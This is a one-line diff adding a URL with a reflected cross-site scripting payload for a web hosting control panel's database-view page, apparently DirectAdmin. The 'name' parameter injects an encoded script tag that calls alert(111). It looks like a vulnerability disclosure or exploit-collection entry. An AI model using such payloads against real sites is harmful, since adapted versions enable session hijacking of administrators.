@@ -1,0 +1,1 @@
+http://www.example.com:2222/CMD_DB_VIEW?DOMAIN=example.com&amp;name=%22%3E%3Cscript%3Ealert%28111%29;%3C/script%3E
